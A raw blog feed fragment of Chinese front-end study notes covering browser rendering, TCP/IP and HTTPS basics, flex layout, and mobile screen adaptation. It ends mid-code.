        <content type="html"><![CDATA[<ul><li>浏览器多进程架构</li><li>浏览器渲染过程</li><li>渲染进程的三个线程</li><li>js 会阻塞 dom 解析</li><li>css 不会阻塞 dom 解析 </li><li>script标签中的async，defer</li><li>如何减少回流和重绘</li></ul><h2 id="浏览器多进程架构"><a href="#浏览器多进程架构" class="headerlink" title="浏览器多进程架构"></a>浏览器多进程架构</h2><pre class=" language-js"><code class="language-js">Browers进程，一个只有一个渲染进程，一个tab窗口对应一个GPU进程，只有一个，负责GPU渲染插件进程，每个插件会创建一个进程<span class="token comment" spellcheck="true">// 浏览器中右上角更多工具 => 任务管理器</span></code></pre><h2 id="浏览器渲染过程"><a href="#浏览器渲染过程" class="headerlink" title="浏览器渲染过程"></a>浏览器渲染过程</h2><blockquote><p>解析html以构建dom树 -&gt; 构建render树 -&gt; 布局render树 -&gt; 绘制render树</p></blockquote><ul><li>DOM Tree：浏览器将HTML解析成树形的数据结构。</li><li>CSS Rule Tree：浏览器将CSS解析成树形的数据结构。</li><li>Render Tree: DOM和CSS合并后生成Render Tree。</li><li>layout: 有了Render Tree，浏览器已经能知道网页中有哪些节点、各个节点的CSS定义以及他们的从属关系，从而去计算出每个节点在屏幕中的位置</li><li>painting: 按照算出来的规则，通过显卡，把内容画到屏幕上。</li><li>reflow（回流）：当浏览器发现某个部分发生了点变化影响了布局，需要倒回去重新渲染，内行称这个回退的过程叫 reflow。reflow 会从 html 这个 root frame 开始递归往下，依次计算所有的结点几何尺寸和位置。reflow 几乎是无法避免的。现在界面上流行的一些效果，比如树状目录的折叠、展开（实质上是元素的显示与隐藏）等，都将引起浏览器的 reflow。鼠标滑过、点击……只要这些行为引起了页面上某些元素的占位面积、定位方式、边距等属性的变化，都会引起它内部、周围甚至整个页面的重新渲 染。通常我们都无法预估浏览器到底会 reflow 哪一部分的代码，它们都彼此相互影响着。</li><li>repaint（重绘）：改变某个元素的背景色、文字颜色、边框颜色等等不影响它周围或内部布局的属性时，屏幕的一部分要重画，但是元素的几何尺寸没有变。</li></ul><pre class=" language-js"><code class="language-js"><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>display<span class="token punctuation">:</span>none 的节点不会被加入Render Tree，而visibility<span class="token punctuation">:</span> hidden 则会，所以，如果某个节点最开始是不显示的，设为display<span class="token punctuation">:</span>none是更优的。<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span>display<span class="token punctuation">:</span>none 会触发 reflow，而 visibility<span class="token punctuation">:</span>hidden 只会触发 repaint，因为没有发现位置变化。<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span>有些情况下，比如修改了元素的样式，浏览器并不会立刻reflow 或 repaint 一次，而是会把这样的操作积攒一批，然后做一次 reflow，这又叫异步 reflow 或增量异步 reflow。但是在有些情况下，比如resize 窗口，改变了页面默认的字体等。对于这些操作，浏览器会马上进行 reflow。</code></pre><h2 id="渲染进程的三个线程"><a href="#渲染进程的三个线程" class="headerlink" title="渲染进程的三个线程"></a>渲染进程的三个线程</h2><p><img src="https://oscimg.oschina.net/oscnet/418cfcf9122d7eb129c92bda22a008d26c8.png" alt="渲染线程"></p><ul><li><p>Compositor Thread</p><p>这个线程既负责接收浏览器传来的垂直同步信号(Vsync，水平同步表示画出一行屏幕线，垂直同步就表示从屏幕顶部到底部的绘制已经完成，指示着前一帧的结束，和新一帧的开始)， 也负责接收OS传来的用户交互，比如滚动、输入、点击、鼠标移动等等。<br>如果可能，Compositor Thread会直接负责处理这些输入，然后转换为对layer的位移和处理，并将新的帧直接commit到GPU Thread，从而直接输出新的页面。否则，比如你在滚动、输入事件等等上注册了回调，又或者当前页面中有动画等情况，那么这个时候Compositor Thread便会唤醒Main Thread，让后者去执行JS、完成重绘、重排等过程，产出新的纹理，然后Compositor Thread再进行相关纹理的commit至GPU Thread，完成输出。</p></li><li><p>Main Thread</p><p><img src="https://oscimg.oschina.net/oscnet/38642585793dd3eeb282143e587ec9e8b37.png" alt="img"></p><p>这里大家就很熟悉了，chrome devtools的Timeline里Main那一栏显示的内容就是Main Thread完成的相关任务：某段JS的执行、Recalculate Style、Update Layer Tree、Paint、Composite Layers等等。 </p></li><li><p>Compositor Tile Worker(s)<br>可能有一个或多个线程，比如PC端的chrome是2个或4个，安卓和safari为1个或2个不等。是由Compositor Thread创建的，专门用来处理tile的Rasterization（前文说过的光栅化）。</p></li></ul><p>可以看到Compositor Thread是一个很核心的东西，后面的俩线程都是由他主要进行控制的。<br>同时，用户输入是直接进入Compositor Thread的，一方面在那些不需要执行JS或者没有CSS动画、不重绘等的场景时，可以直接对用户输入进行处理和响应，而Main Thread是有很复杂的任务流程的。这使得浏览器可以快速响应用户的滚动、打字等等输入，完全不用进主线程。<strong>就比如说js动画要走主线程，css动画有的不会走主线程，直接在 Compositor Thread 中完成</strong></p><blockquote><p>所以说 css 动画会不会被 js 阻塞呢，答案是有时会有时不会，比如 transform</p></blockquote><h2 id="js-会阻塞-dom"><a href="#js-会阻塞-dom" class="headerlink" title="js 会阻塞 dom"></a>js 会阻塞 dom</h2><ul><li>现代浏览器会并行加载js文件，但是按照书写顺序执行代码</li><li>加载或者执行js时会阻塞对标签的解析，也就是阻塞了dom树的形成，只有等到js执行完毕，浏览器才会继续解析标签。没有dom树，浏览器就无法渲染，所以当加载很大的js文件时，可以看到页面很长时间是一片空白</li><li>之所以会阻塞对标签的解析是因为加载的js中可能会创建，删除节点等，这些操作会对dom树产生影响，如果不阻塞，等浏览器解析完标签生成dom树后，js修改了某些节点，那么浏览器又得重新解析，然后生成dom树，性能比较差</li></ul><h2 id="css-不会阻塞-dom-解析但会阻塞渲染"><a href="#css-不会阻塞-dom-解析但会阻塞渲染" class="headerlink" title="css 不会阻塞 dom 解析但会阻塞渲染"></a>css 不会阻塞 dom 解析但会阻塞渲染</h2><ul><li>因为需要具有 DOM 以及 CSSOM 才会构建渲染树，加载 css 的时候肯定无法继续渲染</li></ul><blockquote><p>为什么把 js 放在底部，css 放在顶部</p></blockquote><p>Js 放在顶部会阻塞 dom 的渲染，浏览器可能一直转圈圈，而 css 不会阻塞 dom 解析。</p><p>我们会将 js 放在后面，以减少First Paint的时间</p><h2 id="script标签中的async，defer"><a href="#script标签中的async，defer" class="headerlink" title="script标签中的async，defer"></a>script标签中的async，defer</h2><ul><li><a href="https://juejin.cn/post/6844904197423382535" target="_blank" rel="noopener">script标签中的async，defer</a></li></ul><p>#### </p>]]></content>
      
      
      <categories>
          
          <category> 浏览器 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>计算机基础</title>
      <link href="2020/11/23/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80-%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80/"/>
      <url>2020/11/23/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80-%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80/</url>
      
        <content type="html"><![CDATA[<ul><li>osi七层模型与tcp/ip五层模型</li><li>TCP与UDP的区别</li><li>TCP三次握手，四次挥手</li><li>什么是HTTP协议</li><li>长连接与多路复用</li><li>HTTPS</li><li>进程与线程</li><li>基于对象与面向对象</li></ul><h2 id="osi七层模型与tcp-ip五层模型"><a href="#osi七层模型与tcp-ip五层模型" class="headerlink" title="osi七层模型与tcp/ip五层模型"></a>osi七层模型与tcp/ip五层模型</h2><p><strong>OSI定义了网络互连的七层框架</strong></p><ul><li>应用层：针对你特定应用的协议</li><li>表示层：设备固定的数据格式和网络标准数据格式之间的转化</li><li>会话层：通信管理，负责建立和单开通信连接，管理传输层 以下分层</li><li>传输层：管理两个节点之间的数据传递。负责可靠传输</li><li>网络层：地址管理和路由选择</li><li>数据链路层：互联设备之间传送和识别数据帧</li><li>物理层：界定连接器和网线之间的规格</li></ul><p><strong>TCP/IP四（五）层模型</strong></p><p>每一层都呼叫它的下一层提供的网络来完成自己的需求。（如果是四层模型数据链路层和物理层在一层）</p><ul><li>物理层：负责光电信号传递方式。集线器工作在物理层。以太网协议。</li><li>数据链路层：负责设备之间的数据帧的传输和识别。交换机工作在数据链路层。例如网卡设备的驱动，帧同步，冲突检测，数据差错校验等工作。</li><li>网络层：负责地址管理和路由选择。路由器工作在网络层。</li><li>传输层：负责两台主机之间的数据传输。</li><li>应用层：负责应用程序之间的沟通。网络编程主要针对的就是应用层。</li></ul><h2 id="TCP与UDP的区别"><a href="#TCP与UDP的区别" class="headerlink" title="TCP与UDP的区别"></a>TCP与UDP的区别</h2><ul><li><p>tcp 和 udp 都是属于传输层，传输层提供应用程序间的通信，其功能包括格式化信息流，提供可靠传输。</p></li><li><p>TCP面向连接（如打电话要先拨号建立连接）;UDP是无连接的，即发送数据之前不需要建立连接</p></li><li><p>TCP提供可靠的服务。也就是说，通过TCP连接传送的数据，无差错，不丢失，不重复，且按序到达;UDP尽最大努力交付，即不保证可靠交付。</p></li><li><p>Tcp通过校验和，重传控制，序号标识，滑动窗口、确认应答实现可靠传输。如丢包时的重发控制，还可以对次序乱掉的分包进行顺序控制。</p></li><li><p>UDP具有较好的实时性，工作效率比TCP高，适用于对高速传输和实时性有较高的通信或广播通信。</p></li></ul><p><strong>为什么UDP有时比TCP更有优势?</strong></p><ul><li><p>UDP以其简单、传输快的优势，在越来越多场景下取代了TCP,如实时游戏。</p></li><li><p>网速的提升给UDP的稳定性提供可靠网络保障，丢包率很低，如果使用应用层重传，能够确保传输的可靠性。</p></li><li><p>TCP为了实现网络通信的可靠性，使用了复杂的拥塞控制算法，建立了繁琐的握手过程，由于TCP内置的系统协议栈中，极难对其进行改进。</p></li><li><p>采用TCP，一旦发生丢包，TCP会将后续的包缓存起来，等前面的包重传并接收到后再继续发送，延时会越来越大，基于UDP对实时性要求较为严格的情况下，采用自定义重传机制，能够把丢包产生的延迟降到最低，尽量减少网络问题对游戏性造成影响</p></li></ul><h2 id="TCP三次握手，四次挥手"><a href="#TCP三次握手，四次挥手" class="headerlink" title="TCP三次握手，四次挥手"></a>TCP三次握手，四次挥手</h2><pre class=" language-js"><code class="language-js">三次握手：通俗的讲                客户端：HI听见了吗<span class="token punctuation">,</span>                服务器端：HI我听见了，                客户端：我也听见你了。     接下来开始愉快地聊天四次握手：通俗的讲                客户端：我们分手把，                服务端：好的，你等我把数据给你传输完                服务端：我传输完了，                客户端：好了，可以分手了。 接下来就真正的分手了</code></pre><ul><li><a href="https://img-blog.csdn.net/20180717202520531?watermark/2/text/aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM4OTUwMzE2/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70" target="_blank" rel="noopener">三次握手</a></li><li><a href="https://img-blog.csdn.net/20180717204202563?watermark/2/text/aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM4OTUwMzE2/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70" target="_blank" rel="noopener">四次挥手</a></li><li>SYN (synchronous建立联机) </li><li>ACK (acknowledgement 确认) </li><li>FIN (finish结束) </li><li>Sequence number (顺序号码) </li><li>为什么TIME_WAIT状态需要经过2MSL(最大报文段生存时间)才能返回到CLOSE状态</li></ul><pre class=" language-js"><code class="language-js">为了保证A发送的最后一个ACK报文能够到达B。这个ACK报文段有可能丢失，因而使处在LAST<span class="token operator">-</span>ACK状态的B收不到对已发送的FIN<span class="token operator">+</span>ACK报文段的确认。B会超时重传这个FIN<span class="token operator">+</span>ACK报文段，而A就能在2MSL时间内收到这个重传的FIN<span class="token operator">+</span>ACK报文段。</code></pre><h2 id="什么是-HTTP-协议"><a href="#什么是-HTTP-协议" class="headerlink" title="什么是 HTTP 协议"></a>什么是 HTTP 协议</h2><blockquote><p>超文本传输协议，是一个基于请求与响应，无状态的，应用层的协议，常基于TCP/IP协议传输数据，互联网上应用最为广泛的一种网络协议,所有的WWW文件都必须遵守这个标准。设计HTTP的初衷是为了提供一种发布和接收HTML页面的方法。</p></blockquote><table><thead><tr><th>版本</th><th>产生时间</th><th>内容</th><th>发展现状</th></tr></thead><tbody><tr><td>HTTP/0.9</td><td>1991年</td><td>不涉及数据包传输，规定客户端和服务器之间通信格式，只能GET请求</td><td>没有作为正式的标准</td></tr><tr><td>HTTP/1.0</td><td>1996年</td><td>传输内容格式不限制，增加PUT、PATCH、HEAD、 OPTIONS、DELETE命令</td><td>正式作为标准</td></tr><tr><td>HTTP/1.1</td><td>1997年</td><td>持久连接(长连接)、节约带宽、HOST域、管道机制、分块传输编码</td><td>2015年前使用最广泛</td></tr><tr><td>HTTP/2</td><td>2015年</td><td>多路复用、服务器推送、头信息压缩、二进制协议等</td><td>逐渐覆盖市场</td></tr></tbody></table><h2 id="长连接与多路复用"><a href="#长连接与多路复用" class="headerlink" title="长连接与多路复用"></a>长连接与多路复用</h2><ul><li>长连接：在一个TCP连接上可以传送多个HTTP请求和响应，减少了建立和关闭连接的消耗和延迟，在HTTP1.1中默认开启Connection： keep-alive，一定程度上弥补了HTTP1.0每次请求都要创建连接的缺点。</li><li>多路复用：在 HTTP 1.0 中，发起一个请求是这样的：</li></ul><pre class=" language-js"><code class="language-js">浏览器请求 url <span class="token operator">-</span><span class="token operator">></span> 解析域名 <span class="token operator">-</span><span class="token operator">></span> 建立 HTTP 连接 <span class="token operator">-</span><span class="token operator">></span> 服务器处理文件 <span class="token operator">-</span><span class="token operator">></span> 返回数据 <span class="token operator">-</span><span class="token operator">></span> 浏览器解析、渲染文件 这个流程最大的问题是，每次请求都需要建立一次 HTTP 连接，也就是我们常说的<span class="token number">3</span>次握手<span class="token number">4</span>次挥手，这个过程在一次请求过程中占用了相当长的时间，而且逻辑上是非必需的，因为不间断的请求数据，第一次建立连接是正常的，以后就占用这个通道，下载其他文件，这样效率多高啊！为了解决这个问题， HTTP <span class="token number">1.1</span> 中提供了 Keep<span class="token operator">-</span>Alive，允许我们建立一次 HTTP 连接，来返回多次请求数据。但是这里有两个问题：HTTP <span class="token number">1.1</span> 基于串行文件传输数据，因此这些请求必须是有序的，比如需要传输：hello world，只能从h到d一个一个的传输，不能并行传输，因为接收端并不知道这些字符的顺序。所以实际上我们只是节省了建立连接的时间，而获取数据的时间并没有减少最大并发数问题，假设我们在 Apache 中设置了最大并发数 <span class="token number">300</span>，而因为浏览器本身的限制，最大请求数为 <span class="token number">6</span>，那么服务器能承载的最高并发数是 <span class="token number">50</span>而 HTTP<span class="token operator">/</span><span class="token number">2</span> 引入二进制数据帧和流的概念，其中帧对数据进行顺序标识，这样浏览器收到数据之后，就可以按照序列对数据进行合并，而不会出现合并后数据错乱的情况。同样是因为有了序列，服务器就可以并行的传输数据。HTTP<span class="token operator">/</span><span class="token number">2</span> 对同一域名下所有请求都是基于流，也就是说同一域名不管访问多少文件，也只建立一路连接。同样Apache的最大连接数为<span class="token number">300</span>，因为有了这个新特性，最大的并发就可以提升到<span class="token number">300</span>，比原来提升了<span class="token number">6</span>倍。</code></pre><h2 id="HTTPS"><a href="#HTTPS" class="headerlink" title="HTTPS"></a>HTTPS</h2><p>HTTP请求都是明文传输的，所谓的明文指的是没有经过加密的信息，如果HTTP请求被黑客拦截，并且里面含有银行卡密码等敏感数据的话，会非常危险。为了解决这个问题，Netscape 公司制定了HTTPS协议，HTTPS可以将数据加密传输，也就是传输的是密文，即便黑客在传输过程中拦截到数据也无法破译，这就保证了网络通信的安全。</p><ul><li><p>HTTP协议运行在TCP之上，所有传输的内容都是明文，HTTPS运行在SSL/TLS之上，SSL/TLS运行在TCP之上，所有传输的内容都经过加密的，保证了通信的保密性。当然SSL协议并不能对UDP应用进行保护</p></li><li><p>虽然使用 HTTP 协议无法确定通信方，使用 SSL可以。SSL使用了一种被称为证书的手段，证书由值得信任的第三方机构颁发，使用HTTPS协议需要到CA申请证书，一般免费证书很少，需要交费。证书用以证明服务器和客户端是实际存在的。身份确认过程使用RSA非对称密钥加密方式（破解难度基于两个大素数乘积的因式分解难度），但是为了提高效率，身份确认完成后使用共商后的对称密钥。</p></li><li><p>SSL协议位于TCP/IP协议与各种应用层协议（不止能用于HTTP）之间，为数据通讯提供安全支持。</p><p>SSL协议可分为两层：</p><p>（1）SSL记录协议：建立在可靠的传输协议（如TCP）之上，为高层协议提供数据封装、压缩、加密等基本功能的支持。</p><p>（2）SSL握手协议：建立在记录协议之上，用于数据传输开始前的双方身份认证、协商加密算法、交换加密密钥等。</p></li><li><p>主要流程：</p><ul><li>客户端向服务器发起HTTPS请求，连接到服务器的443端口</li><li>服务器端有一个密钥对，即公钥和私钥，是用来进行非对称加密使用的，服务器端保存着私钥，不能将其泄露，公钥可以发送给任何人。</li><li>服务器将自己的公钥发送给客户端。</li><li>客户端收到服务器端的证书之后，会对证书进行检查，验证其合法性，如果发现发现证书有问题，那么HTTPS传输就无法继续。如果公钥合格，那么客户端会生成一个随机值，这个随机值就是用于进行对称加密的密钥，我们将该密钥称之为client key，即客户端密钥，这样在概念上和服务器端的密钥容易进行区分。然后用服务器的公钥对客户端密钥进行非对称加密，这样客户端密钥就变成密文了，至此，HTTPS中的第一次HTTP请求结束。</li><li>客户端会发起HTTPS中的第二个HTTP请求，将加密之后的客户端密钥发送给服务器。</li><li>服务器接收到客户端发来的密文之后，会用自己的私钥对其进行非对称解密，解密之后的明文就是客户端密钥，然后用客户端密钥对数据进行对称加密，这样数据就变成了密文。</li><li>然后服务器将加密后的密文发送给客户端。</li><li>客户端收到服务器发送来的密文，用客户端密钥对其进行对称解密，得到服务器发送的数据。这样HTTPS中的第二个HTTP请求结束，整个HTTPS传输完成。</li></ul></li><li><p><strong>注意：</strong> <strong>HTTPS 在内容传输的加密上使用的是对称加密，非对称加密只作用在证书验证阶段。</strong></p></li><li><p>为什么数据传输是用对称加密的？</p><ul><li>非对称加密的加解密<strong>效率非常低</strong>，而HTTP的应用场景中通常端与端之间存在大量的交互，非对称加密的效率是无法接受的。</li><li>在 HTTPS 的场景中只有服务端保存了私钥，<strong>客户端不做非对称密钥生成</strong>，一对公钥和私钥只能实现单向的加解密，所以HTTPS 中内容传输加密采取的是对称加密，而不是非对称加密。</li></ul></li></ul><hr><blockquote><p>https并非应用层的一种新协议，只是http通信接口部分用ssl/tls协议代替而已。</p><p>SSL和TLS都是加密协议<br>通常http直接和tcp通信，当使用ssl时则演变成先和ssl通信，再由ssl和tcp通信。<br>所谓https，其实就是身披ssl协议这层外壳的http。（回忆一下osi7层,TCP/IP4层，我们学的是5层）</p><p>SSL协议采用的是非对称加密算法，客户端先向服务器端索要公钥，然后用公钥加密信息，服务器收到密文后，用自己的私钥解密.</p><p>RSA算法：两个大素数p,q，n=pq,f(n)=(p-1)(q-1),1&lt;b&lt;f(n),a=b^-1modf(n),公钥n,b,私钥p,q,a</p><p>证书，顾名思义，就是证明的文件。例如浏览器和 tlanyan.me 服务器通信，浏览器怎么知道对方就是 tlanyan.me 对应的服务器呢？在不可信的网络下通信，中立的第三方作用就显现出来了。权威的第三方中立机构（ Certificate Authority, CA）收到 tlanyan.me 持有者的证书请求并核验信息后，将持有者的名称、公钥与 CA 用私钥生成的数字签名等信息写成证书颁发给申请者。</p><p>当你访问使用 HTTPS（连接安全）的网站时，该网站的服务器会使用证书向浏览器（如 Chrome）证明该网站的身份。任何人都可以创建证书，随意声称对应的网站是任意网站。</p><p>为了确保您安全上网，Chrome 会要求网站使用来自受信任组织发放的证书。</p></blockquote><h2 id="进程与线程"><a href="#进程与线程" class="headerlink" title="进程与线程"></a>进程与线程</h2><ul><li>进程是CPU资源分配的最小单位（能拥有资源和独立运行的最小单位）</li><li>线程是CPU调度的最小单位（线程是建立在进程基础上的一次程序运行单位，一个进程可以有多个线程）</li><li>同一进程中的多条线程讲共享该进程中的全部系统资源，但是同一进程中的多个线程有各自的调用栈，自己的线程本地存储。一个进程可以有很多线程，每条线程并行执行不同的任务</li><li>进程间通信方式：管道、信号量、消息队列、共享内存、套接字（socket）。</li><li>线程间的通信目的主要是用于线程同步，所以线程没有像进程通信中的用于数据交换的通信机制。（锁机制：包括互斥锁、条件变量、读写锁，信号量机制(Semaphore)，信号机制(Signal)）</li></ul><h2 id="基于对象与面向对象"><a href="#基于对象与面向对象" class="headerlink" title="基于对象与面向对象"></a>基于对象与面向对象</h2><ul><li>面向对象的三大特点（封装，继承，多态）缺一不可，例如 c++，java</li><li>基于对象的语言，使用一些封装好的对象，调用对象的方法，设置对象的属性，但是无法派生新的对象类型，只能使用现有对象的方法和属性。</li><li>javascript虽然通过原型链等实现了继承，通过arguments实现函数重载等特点，但是都是属于模拟实现，本质上还是基于对象的语言，实际上可以实现面向对象编程。</li></ul>]]></content>
      
      
      <categories>
          
          <category> 计算机基础 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>flex布局</title>
      <link href="2020/11/22/CSS-flex%E5%B8%83%E5%B1%80/"/>
      <url>2020/11/22/CSS-flex%E5%B8%83%E5%B1%80/</url>
      
        <content type="html"><![CDATA[<ul><li>flex常见属性</li><li>flex-grow，flex-shrink，flex-basis</li><li>flex:1</li><li>space-evenly</li><li>flex布局实例</li></ul><hr><ul><li><a href="http://www.ruanyifeng.com/blog/2015/07/flex-grammar.html" target="_blank" rel="noopener">Flex 布局教程：语法篇</a></li><li><a href="https://blog.csdn.net/qq_40138556/article/details/103967529" target="_blank" rel="noopener">flex:1详解</a></li><li><a href="https://blog.csdn.net/u012260238/article/details/86656175" target="_blank" rel="noopener">重点看这篇文章</a></li></ul><pre class=" language-css"><code class="language-css"><span class="token selector"><span class="token class">.item</span> </span><span class="token punctuation">{</span><span class="token property">flex</span><span class="token punctuation">:</span> none<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token selector"><span class="token class">.item</span> </span><span class="token punctuation">{</span>    <span class="token property">flex-grow</span><span class="token punctuation">:</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token property">flex-shrink</span><span class="token punctuation">:</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token property">flex-basis</span><span class="token punctuation">:</span> auto<span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><pre class=" language-css"><code class="language-css"><span class="token selector"><span class="token class">.item</span> </span><span class="token punctuation">{</span><span class="token property">flex</span><span class="token punctuation">:</span> auto<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token selector"><span class="token class">.item</span> </span><span class="token punctuation">{</span>    <span class="token property">flex-grow</span><span class="token punctuation">:</span> <span class="token number">1</span><span class="token punctuation">;</span>    <span class="token property">flex-shrink</span><span class="token punctuation">:</span> <span class="token number">1</span><span class="token punctuation">;</span>    <span class="token property">flex-basis</span><span class="token punctuation">:</span> auto<span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><pre class=" language-css"><code class="language-css"><span class="token selector"><span class="token class">.item</span> </span><span class="token punctuation">{</span><span class="token property">flex</span><span class="token punctuation">:</span> <span class="token number">1</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token selector"><span class="token class">.item</span> </span><span class="token punctuation">{</span>    <span class="token property">flex-grow</span><span class="token punctuation">:</span> <span class="token number">1</span><span class="token punctuation">;</span>    <span class="token property">flex-shrink</span><span class="token punctuation">:</span> <span class="token number">1</span><span class="token punctuation">;</span>    <span class="token property">flex-basis</span><span class="token punctuation">:</span> <span class="token number">0%</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><pre class=" language-css"><code class="language-css"><span class="token selector"><span class="token class">.item-1</span> </span><span class="token punctuation">{</span><span class="token property">flex</span><span class="token punctuation">:</span> <span class="token number">0%</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token selector"><span class="token class">.item-1</span> </span><span class="token punctuation">{</span>    <span class="token property">flex-grow</span><span class="token punctuation">:</span> <span class="token number">1</span><span class="token punctuation">;</span>    <span class="token property">flex-shrink</span><span class="token punctuation">:</span> <span class="token number">1</span><span class="token punctuation">;</span>    <span class="token property">flex-basis</span><span class="token punctuation">:</span> <span class="token number">0%</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token selector"><span class="token class">.item-2</span> </span><span class="token punctuation">{</span><span class="token property">flex</span><span class="token punctuation">:</span> <span class="token number">24</span>px<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token selector"><span class="token class">.item-1</span> </span><span class="token punctuation">{</span>    <span class="token property">flex-grow</span><span class="token punctuation">:</span> <span class="token number">1</span><span class="token punctuation">;</span>    <span class="token property">flex-shrink</span><span class="token punctuation">:</span> <span class="token number">1</span><span class="token punctuation">;</span>    <span class="token property">flex-basis</span><span class="token punctuation">:</span> <span class="token number">24</span>px<span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><pre class=" language-css"><code class="language-css"><span class="token selector"><span class="token class">.item</span> </span><span class="token punctuation">{</span><span class="token property">flex</span><span class="token punctuation">:</span> <span class="token number">2</span> <span class="token number">3</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token selector"><span class="token class">.item</span> </span><span class="token punctuation">{</span>    <span class="token property">flex-grow</span><span class="token punctuation">:</span> <span class="token number">2</span><span class="token punctuation">;</span>    <span class="token property">flex-shrink</span><span class="token punctuation">:</span> <span class="token number">3</span><span class="token punctuation">;</span>    <span class="token property">flex-basis</span><span class="token punctuation">:</span> <span class="token number">0%</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><pre class=" language-js"><code class="language-js">flex<span class="token operator">-</span>basis 规定的是子元素的基准值。所以是否溢出的计算与此属性息息相关。flex<span class="token operator">-</span>basis 规定的范围取决于 box<span class="token operator">-</span>sizing。这里主要讨论以下 flex<span class="token operator">-</span>basis 的取值情况：auto：首先检索该子元素的主尺寸，如果主尺寸不为 auto，则使用值采取主尺寸之值；如果也是 auto，则使用值为 content。<span class="token function">content：指根据该子元素的内容自动布局。</span><span class="token punctuation">(</span>内容多的占比也会多<span class="token punctuation">)</span>百分比：根据其包含块（即伸缩父容器）的主尺寸计算。如果包含块的主尺寸未定义（即父容器的主尺寸取决于子元素），则计算结果和设为 auto 一样。</code></pre><ul><li>space-evenly为项目之间间距与项目与容器间距相等，相当于除去项目宽度，平均分配了剩余宽度作为项目左右margin。</li></ul><h2 id="flex-布局实例"><a href="#flex-布局实例" class="headerlink" title="flex 布局实例"></a>flex 布局实例</h2><ul><li>场景：一行5个卡片，卡片数量不限，自动换行，从左到右排列，比如现在有9个卡片：</li></ul><pre class=" language-js"><code class="language-js"><span class="token comment" spellcheck="true">// 如下效果</span><span class="token number">1</span> <span class="token number">1</span> <span class="token number">1</span> <span class="token number">1</span> <span class="token number">1</span><span class="token number">1</span> <span class="token number">1</span> <span class="token number">1</span> <span class="token number">1</span></code></pre><ul><li>每一行子元素的总基准值是：20% * n</li><li>flex-grow 和 flex-shrink 都是 0，不允许放大和缩小，除基准值之外的剩余空间不会被分配</li></ul><pre class=" language-css"><code class="language-css"><span class="token selector"><span class="token class">.list</span> </span><span class="token punctuation">{</span>  <span class="token property">display</span><span class="token punctuation">:</span> flex<span class="token punctuation">;</span>  <span class="token property">flex-flow</span><span class="token punctuation">:</span> row wrap<span class="token punctuation">;</span>  <span class="token property">justify-content</span><span class="token punctuation">:</span> start<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token selector"><span class="token class">.item</span> </span><span class="token punctuation">{</span>  <span class="token property">flex</span><span class="token punctuation">:</span> <span class="token number">0</span> <span class="token number">0</span> <span class="token number">20%</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre>]]></content>
      
      
      <categories>
          
          <category> CSS </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>移动端适配</title>
      <link href="2020/11/16/%E7%A7%BB%E5%8A%A8%E7%AB%AF-%E7%A7%BB%E5%8A%A8%E7%AB%AF%E9%80%82%E9%85%8D/"/>
      <url>2020/11/16/%E7%A7%BB%E5%8A%A8%E7%AB%AF-%E7%A7%BB%E5%8A%A8%E7%AB%AF%E9%80%82%E9%85%8D/</url>
      
        <content type="html"><![CDATA[<ul><li>逻辑像素与物理像素</li><li>常见长度单位</li><li>移动端 1px</li><li>适配案例</li><li>常见移动端适配方案</li></ul><h2 id="逻辑像素与物理像素"><a href="#逻辑像素与物理像素" class="headerlink" title="逻辑像素与物理像素"></a>逻辑像素与物理像素</h2><ul><li>pt: html css中的使用的单位像素px: 实际上指的是逻辑像素pt</li><li>px: photoshop测量中的但是实际上指的是物理像素, 物理像素即表示的是一个点, 大小固定</li><li>一个pt可以包含多个物理像素px</li><li><p>在iphone6中一个单位的逻辑像素包含2个物理像素，iphone的分辨率为<code>375*667</code>实际上指的是逻辑像素为<code>375*667</code>, 所以一般移动端的设计图纸一般是给的是<code>750*1334</code>,  是因为一个逻辑像素pt包含两个物理像素px</p></li><li><p>不同设备下的分辨率不同, 在iphone6s中 一个逻辑像素pt包含三个物理像素px  即 1pt = 3px</p></li></ul><h2 id="常见长度单位"><a href="#常见长度单位" class="headerlink" title="常见长度单位"></a>常见长度单位</h2><h3 id="em"><a href="#em" class="headerlink" title="em"></a>em</h3><p>em是相对长度单位。它的单位长度是根据元素的文本垂直长度来决定的。可以作用在width、height、line-height、margin、padding、border等样式的设置上。 如当前对行内文本的字体尺寸未被人为设置，则相对于浏览器的默认字体尺寸。 默认1em=16px。如果在body选择器中声明font-size=62.5%,则1em=10px。</p><pre class=" language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>style</span><span class="token punctuation">></span></span><span class="token style language-css">    <span class="token selector"><span class="token class">.parent</span></span><span class="token punctuation">{</span>             <span class="token property">font-size</span><span class="token punctuation">:</span><span class="token number">5</span>em<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">/*80px*/</span>            <span class="token property">height</span><span 